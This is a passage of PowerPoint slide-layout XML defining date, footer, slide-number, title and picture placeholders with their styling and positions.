            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{7D9237E2-D6D8-4F93-B4E7-7A3A919C426E}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Footer Placeholder 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A359C2BF-21AF-4D80-AF5B-B2C0FCB01489}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2773246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endParaRPr lang="en-US" dirty="0"/>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15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1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master text styles</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Date Placeholder 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{31028AF4-9E92-4B7F-8FF5-70E8FC8CFC8C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr dirty="0"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{3D2B433E-0492-43EF-A4EE-44302D691569}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Slide Number Placeholder 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E1D98D76-29B8-4104-9B56-41E0C2B6C0CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1050">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{04194F72-16B3-45E5-89BA-A531D9C6F909}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Footer Placeholder 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9ABC4DA1-E98C-46DB-8CFC-528377A9ECFC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3368726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9D27DB-781C-4E9A-BD52-304D332D393A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr dirty="0"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{E7950DC9-D196-45CC-BA9F-D6D5EE325BD5}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Footer Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8486506-D8E7-4646-B7C2-4FD747079745}"/>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4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{76153B6E-7646-4B77-8451-44B7A82A0510}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1050">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{0D1442FA-41D6-4256-AB11-698261B17F2A}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="172329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D99147-29DF-4A7C-8453-281A248DF253}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{9AE3B4A3-0DFD-4DB7-87BB-BDD024516FD0}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Footer Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EC537661-D16B-47AD-A3C6-F4279F63C180}"/>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3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3E1F0016-F045-4EFE-9DBB-8B83615EE105}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6248400"/>
            <a:ext cx="533400" cy="381000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1050">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{FA9458CC-7BDB-4AF7-84A8-156B462129CE}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1808878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4" name="Picture 9" descr="sm_globe.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{09D0E091-9432-4B8A-83A8-FAA0571AE4C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13172" y="1755775"/>
            <a:ext cx="1614488" cy="1689100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="50800" cap="sq" cmpd="dbl">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609600" y="273050"/>
            <a:ext cx="8077200" cy="869950"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:buNone/>
              <a:defRPr sz="3300" b="0"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>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1CA5AAB-E0EE-42C4-9DC4-6495C8701DF4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{453168CF-9361-4963-AFD4-61E898C8E6D4}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A5874615-F617-433B-BCA5-EEDB193A1A0C}"/>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6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{27E2315F-E1FB-4BBC-9A69-9E76F921770B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1050">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{51AC466F-202A-449E-ABD9-88FA7D413812}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="398427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DC81B99-AD79-4350-B1B4-4A9A5B2E1411}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="white">
          <a:xfrm>
            <a:off x="-9525" y="4572001"/>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E1B30C86-7539-4707-BB1E-130DEE07594C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-9525" y="4664075"/>
            <a:ext cx="1463279"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Rectangle 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{783F932B-EE3A-413F-8794-3061763118EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1544241" y="4654550"/>
            <a:ext cx="7599759"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Rectangle 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{72ACDC2E-C064-4B1C-9FEF-B25D088F4C9E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="white">
          <a:xfrm>
            <a:off x="1447800" y="1"/>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275"/>
            </a:lvl1pPr>
            <a:lvl2pPr>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="900"/>
            </a:lvl2pPr>
            <a:lvl3pPr>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="750"/>
            </a:lvl3pPr>
            <a:lvl4pPr>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="675"/>
            </a:lvl4pPr>
            <a:lvl5pPr>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="675"/>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100" b="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>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2400"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" dirty="0"/>
              <a:t>Click icon to add picture</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Date Placeholder 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F6A6835-255E-4F53-B0A2-B0B3683D2384}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6248400" y="6248401"/>
            <a:ext cx="2667000" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{6A64BEE4-B63B-4B07-A227-E3BC01DE73A7}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Slide Number Placeholder 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{32BA4851-7472-4558-AF6A-2F94ED631D9C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4667251"/>
            <a:ext cx="1447800" cy="663575"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2100">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{A8110B99-22AD-4655-8E97-9D99EF66D449}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Footer Placeholder 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8C69500C-8063-44CD-BB8C-9F570B8D59C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="6248401"/>
            <a:ext cx="4572000" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1549822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9E2AC5C-2BDA-4ED0-A8CA-408672F79305}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{93759BA1-3B3D-49D7-B679-4527783122F8}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{09DD99E1-9A49-4EB3-9467-57A67F5FE9CE}"/>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22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02BB8BDF-113A-4D93-A64B-0BF6D345E473}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{23720B14-E841-43C9-B349-AC4B576B0B80}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2498289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C8BDF40-E20B-4BD8-84C1-E65583DF3F27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="white">
          <a:xfrm>
            <a:off x="6096000" y="0"/>
            <a:ext cx="320279"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A8629C48-D796-4AA1-B2C2-92BDFCA12EB1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6142435"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5829E37C-2198-4D37-B81B-E710DF5B30FF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6142435"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Vertical Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" orient="vert"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="609602"/>
            <a:ext cx="2057400" cy="55165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B7357676-74DF-4791-B288-69977DC969F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="6248401"/>
            <a:ext cx="2209800" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr dirty="0"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{9126EFFC-9F40-4763-B739-1C539166ACDE}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{15691A4D-8A37-4BF3-AA0E-515C11694FC4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6248401"/>
            <a:ext cx="5573316" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Slide Number Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B276B00B-ADE0-415F-8138-D1827CD9FC0C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="5989439" y="144661"/>
            <a:ext cx="533400" cy="244079"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{61ABE1C5-EE8B-4BC6-9CA6-2359143DF2B8}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="125599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5"/>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2"/>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id="{A4F6F228-293F-451A-B398-4A2C5AA16A75}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr dirty="0"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
